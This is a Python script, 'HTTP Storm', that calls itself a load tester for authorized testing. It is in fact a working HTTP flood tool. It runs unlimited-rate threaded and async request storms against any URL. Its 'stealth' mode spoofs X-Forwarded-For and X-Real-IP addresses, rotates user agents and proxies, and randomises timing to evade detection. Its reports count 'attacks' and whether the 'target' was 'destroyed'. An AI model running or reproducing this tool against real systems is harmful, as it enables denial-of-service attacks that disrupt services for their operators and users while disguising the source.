#!/usr/bin/env python3
"""
HTTP Storm - Advanced Load Testing Tool
Designed for authorized testing and educational purposes
"""

import requests
import asyncio
import aiohttp
import time
import threading
import argparse
import sys
import random
import json
import hashlib
import statistics
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

class HTTPStorm:
    def __init__(self, config):
        self.url = config['url']
        self.duration = config['duration']
        self.requests = config.get('requests', 0)
        self.threads = config['threads']
        self.rps = config['rps']
        self.method = config['method']
        self.headers = config['headers']
        self.payloads = config['payloads']
        self.user_agents = config['user_agents']
        self.proxies = config['proxies']
        self.stealth = config.get('stealth', False)
        self.random_delay = config.get('random_delay', False)
        self.verify_ssl = config.get('verify_ssl', False)
        self.timeout = config.get('timeout', 10)
        
        # Stats
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'timeouts': 0,
            'status_codes': {},
            'response_times': [],
            'errors': {},
            'bytes_sent': 0,
            'bytes_received': 0,
            'start_time': 0,
            'rps_history': []
        }
        
        self.running = True
        self.lock = threading.Lock()
        
    def get_random_headers(self):
        """Generate random headers for stealth"""
        base_headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'application/json,text/plain,*/*',
                '*/*'
            ]),
            'Accept-Language': random.choice([
                'en-US,en;q=0.9', 'es-ES,es;q=0.9', 'fr-FR,fr;q=0.9',
                'de-DE,de;q=0.9', 'zh-CN,zh;q=0.9'
            ]),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': random.choice(['keep-alive', 'close']),
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store'])
        }
        
        # Add custom headers
        if self.headers:
            base_headers.update(self.headers)
            
        # Random additional headers for stealth
        if self.stealth:
            if random.random() < 0.3:
                base_headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            if random.random() < 0.2:
                base_headers['X-Real-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            if random.random() < 0.4:
                base_headers['DNT'] = '1'
                
        return base_headers
    
    def get_random_payload(self):
        """Get random payload for requests"""
        if not self.payloads:
            return None
        return random.choice(self.payloads)
    
    def make_request(self, session):
        """Make HTTP request with advanced configuration"""
        if not self.running:
            return None
            
        try:
            headers = self.get_random_headers()
            payload = self.get_random_payload()
            proxy = random.choice(self.proxies) if self.proxies else None
            
            # Random delay for stealth
            if self.random_delay:
                time.sleep(random.uniform(0.01, 0.5))
            
            start_time = time.time()
            
            if self.method.upper() == 'GET':
                response = session.get(
                    self.url,
                    headers=headers,
                    proxies={'http': proxy, 'https': proxy} if proxy else None,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
            elif self.method.upper() == 'POST':
                response = session.post(
                    self.url,
                    headers=headers,
                    data=payload if isinstance(payload, str) else json.dumps(payload),
                    proxies={'http': proxy, 'https': proxy} if proxy else None,
                    timeout=self.timeout,
                    verify=self.verify_ssl
                )
            
            response_time = time.time() - start_time
            
            with self.lock:
                self.stats['total_requests'] += 1
                self.stats['response_times'].append(response_time)
                self.stats['bytes_received'] += len(response.content)
                if payload:
                    self.stats['bytes_sent'] += len(str(payload))
                
                if response.status_code < 400:
                    self.stats['successful'] += 1
                else:
                    self.stats['failed'] += 1
                
                status = str(response.status_code)
                self.stats['status_codes'][status] = self.stats['status_codes'].get(status, 0) + 1
            
            return {
                'status': response.status_code,
                'time': response_time,
                'size': len(response.content)
            }
            
        except requests.exceptions.Timeout:
            with self.lock:
                self.stats['total_requests'] += 1
                self.stats['timeouts'] += 1
                self.stats['failed'] += 1
            return {'error': 'timeout'}
            
        except Exception as e:
            with self.lock:
                self.stats['total_requests'] += 1
                self.stats['failed'] += 1
                error_type = type(e).__name__
                self.stats['errors'][error_type] = self.stats['errors'].get(error_type, 0) + 1
            return {'error': str(e)}
    
    def worker_thread(self, thread_id):
        """Worker thread for traditional mode"""
        session = requests.Session()
        
        # Configure session adapter
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=0
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        requests_made = 0
        delay = 1.0 / (self.rps / self.threads) if self.rps > 0 else 0

        while self.running:
            if self.requests > 0 and self.stats['total_requests'] >= self.requests:
                break

            if self.rps > 0:
                time.sleep(delay)
            
            result = self.make_request(session)
            requests_made += 1
            
            # Progress indicator for high-volume attacks
            if requests_made % 100 == 0:
                print(f"🔥 [T{thread_id}] {requests_made} shots fired")
    
    async def async_worker(self, session, semaphore):
        """Async worker for maximum performance"""
        async with semaphore:
            try:
                headers = self.get_random_headers()
                start_time = time.time()
                
                if self.random_delay:
                    await asyncio.sleep(random.uniform(0.01, 0.2))
                
                async with session.get(self.url, headers=headers, timeout=self.timeout) as response:
                    content = await response.read()
                    response_time = time.time() - start_time
                    
                    with self.lock:
                        self.stats['total_requests'] += 1
                        self.stats['response_times'].append(response_time)
                        self.stats['bytes_received'] += len(content)
                        
                        if response.status < 400:
                            self.stats['successful'] += 1
                        else:
                            self.stats['failed'] += 1
                        
                        status = str(response.status)
                        self.stats['status_codes'][status] = self.stats['status_codes'].get(status, 0) + 1
                        
            except Exception as e:
                with self.lock:
                    self.stats['total_requests'] += 1
                    self.stats['failed'] += 1
                    error_type = type(e).__name__
                    self.stats['errors'][error_type] = self.stats['errors'].get(error_type, 0) + 1
    
    async def async_storm(self):
        """Async storm mode for maximum RPS"""
        connector = aiohttp.TCPConnector(
            limit=0,  # No limit
            limit_per_host=0,
            ttl_dns_cache=300,
            use_dns_cache=True,
        )
        
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        semaphore = asyncio.Semaphore(self.threads)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []

            while self.running:
                if self.requests > 0 and self.stats['total_requests'] >= self.requests:
                    break

                if len(tasks) < self.threads * 20:  # Maintain task buffer
                    task = asyncio.create_task(self.async_worker(session, semaphore))
                    tasks.append(task)
                
                # Clean completed tasks
                tasks = [t for t in tasks if not t.done()]
                
                await asyncio.sleep(0.001)  # Minimal pause
    
    def stats_monitor(self):
        """Real-time statistics monitor"""
        last_count = 0
        
        while self.running:
            time.sleep(5)  # Update every 5 seconds
            
            with self.lock:
                current_count = self.stats['total_requests']
                if current_count == 0:
                    continue
                
                # Calculate current RPS
                current_rps = (current_count - last_count) / 5
                self.stats['rps_history'].append(current_rps)
                last_count = current_count
                
                # Calculate stats
                elapsed = time.time() - self.stats['start_time']
                avg_rps = current_count / elapsed if elapsed > 0 else 0
                success_rate = (self.stats['successful'] / current_count) * 100
                
                if self.stats['response_times']:
                    avg_response = statistics.mean(self.stats['response_times'])
                    min_response = min(self.stats['response_times'])
                    max_response = max(self.stats['response_times'])
                else:
                    avg_response = min_response = max_response = 0
                
                # Display stats
                print(f"\n{'='*60}")
                print(f"⚡ HTTP STORM - Live Stats [{datetime.now().strftime('%H:%M:%S')}]")
                print(f"{'='*60}")
                print(f"🎯 Target: {self.url}")
                print(f"📊 Total Requests: {current_count:,}")
                print(f"✅ Successful: {self.stats['successful']:,} ({success_rate:.1f}%)")
                print(f"❌ Failed: {self.stats['failed']:,}")
                print(f"⏱️  Timeouts: {self.stats['timeouts']:,}")
                print(f"🚀 Current RPS: {current_rps:.1f}")
                print(f"📈 Average RPS: {avg_rps:.1f}")
                print(f"⏰ Avg Response: {avg_response:.3f}s")
                print(f"🔄 Range: {min_response:.3f}s - {max_response:.3f}s")
                print(f"📤 Data Sent: {self.stats['bytes_sent']:,} bytes")
                print(f"📥 Data Received: {self.stats['bytes_received']:,} bytes")
                
                if self.stats['status_codes']:
                    print(f"\n📋 Status Codes:")
                    for code, count in sorted(self.stats['status_codes'].items()):
                        percentage = (count / current_count) * 100
                        print(f"   {code}: {count:,} ({percentage:.1f}%)")
                
                if self.stats['errors']:
                    print(f"\n⚠️  Errors:")
                    for error, count in list(self.stats['errors'].items())[:5]:
                        print(f"   {error}: {count:,}")
                
                print(f"{'='*60}")
    
    def start_storm(self, use_async=False):
        """Start the HTTP storm"""
        self.stats['start_time'] = time.time()
        
        print(f"""
╔══════════════════════════════════════════════════════════╗
║                    ⚡ HTTP STORM ⚡                       ║
╠══════════════════════════════════════════════════════════╣
║ 🎯 Target: {self.url:<42} ║
║ ⏱️  Duration: {self.duration}s | 🧵 Threads: {self.threads:<3} | 🚀 RPS: {self.rps:<4} ║
║ 📡 Method: {self.method:<4} | ⏰ Timeout: {self.timeout}s              ║
║ 🎭 Stealth: {'ON' if self.stealth else 'OFF':<3} | 🔀 Random Delay: {'ON' if self.random_delay else 'OFF':<3}   ║
║ 🔧 Mode: {('Async' if use_async else 'Multi-thread'):<45} ║
╚══════════════════════════════════════════════════════════╝
        """)
        
        # Start stats monitor
        stats_thread = threading.Thread(target=self.stats_monitor)
        stats_thread.daemon = True
        stats_thread.start()
        
        try:
            if self.requests > 0:
                # Request-limited mode
                if use_async:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(self.async_storm())
                else:
                    threads = []
                    for i in range(self.threads):
                        t = threading.Thread(target=self.worker_thread, args=(i,))
                        t.daemon = True
                        threads.append(t)
                        t.start()

                    for t in threads:
                        t.join()
                self.running = False
            else:
                # Duration-limited mode
                if use_async:
                    def stop_storm():
                        time.sleep(self.duration)
                        self.running = False

                    stop_thread = threading.Thread(target=stop_storm)
                    stop_thread.start()

                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(self.async_storm())
                else:
                    threads = []
                    for i in range(self.threads):
                        t = threading.Thread(target=self.worker_thread, args=(i,))
                        t.daemon = True
                        threads.append(t)
                        t.start()

                    time.sleep(self.duration)
                    self.running = False

                    for t in threads:
                        t.join(timeout=5)
                    
        except KeyboardInterrupt:
            print("\n🛑 Storm interrupted by user")
            self.running = False
        
        self.print_final_report()
    
    def print_final_report(self):
        """Print final storm report"""
        total = self.stats['total_requests']
        if total == 0:
            print("❌ No requests completed")
            return
        
        elapsed = time.time() - self.stats['start_time']
        success_rate = (self.stats['successful'] / total) * 100
        avg_rps = total / elapsed if elapsed > 0 else 0
        
        if self.stats['response_times']:
            avg_response = statistics.mean(self.stats['response_times'])
            median_response = statistics.median(self.stats['response_times'])
        else:
            avg_response = median_response = 0
        
        total_data = (self.stats['bytes_sent'] + self.stats['bytes_received']) / 1024 / 1024
        
        print(f"""
╔══════════════════════════════════════════════════════════╗
║                  📊 STORM REPORT 📊                     ║
╠══════════════════════════════════════════════════════════╣
║ ⏱️  Duration: {elapsed:.2f}s                                 ║
║ 🎯 Total Attacks: {total:,}                             ║
║ 🚀 Requests/sec: {avg_rps:.2f}                          ║
║ ✅ Success Rate: {success_rate:.2f}%                        ║
║ ⏰ Avg Response: {avg_response:.3f}s                         ║
║ 📊 Median Response: {median_response:.3f}s                   ║
║ 💾 Data Transferred: {total_data:.2f} MB                    ║
║ 🎯 Target Destroyed: {'YES' if success_rate > 80 else 'PARTIAL' if success_rate > 50 else 'DEFENDED'} 🔥                   ║
╚══════════════════════════════════════════════════════════╝
        """)

def load_config(config_file):
    """Load configuration from JSON file"""
    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"❌ Config file {config_file} not found")
        return {}
    except json.JSONDecodeError:
        print(f"❌ Invalid JSON in {config_file}")
        return {}

def main():
    parser = argparse.ArgumentParser(description='⚡ HTTP Storm - Advanced Load Tester')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-d', '--duration', type=int, default=10, help='Duration in seconds (default: 10)')
    parser.add_argument('-n', '--requests', type=int, default=0, help='Number of requests to make (0 = unlimited, overrides duration)')
    parser.add_argument('-t', '--threads', type=int, default=50, help='Number of threads (default: 50)')
    parser.add_argument('-r', '--rps', type=int, default=0, help='Requests per second (0 = unlimited)')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method')
    parser.add_argument('--timeout', type=float, default=10, help='Request timeout (default: 10s)')
    parser.add_argument('--use-async', action='store_true', help='Use async mode (higher performance)')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode (random headers/IPs)')
    parser.add_argument('--random-delay', action='store_true', help='Add random delays between requests')
    parser.add_argument('--config', help='Load configuration from JSON file')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL verification')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print("❌ Error: URL must start with http:// or https://")
        sys.exit(1)
    
    # Default user agents
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
    ]
    
    # Build configuration
    config = {
        'url': args.url,
        'duration': args.duration,
        'requests': args.requests,
        'threads': args.threads,
        'rps': args.rps,
        'method': args.method,
        'headers': {},
        'payloads': [],
        'user_agents': user_agents,
        'proxies': [],
        'stealth': args.stealth,
        'random_delay': args.random_delay,
        'verify_ssl': not args.no_ssl_verify,
        'timeout': args.timeout
    }
    
    # Load config file if specified
    if args.config:
        file_config = load_config(args.config)
        # URL from command line takes precedence
        file_config['url'] = args.url
        config.update(file_config)
    
    # Create and start storm
    storm = HTTPStorm(config)
    storm.start_storm(use_async=args.use_async)

if __name__ == "__main__":
    main()
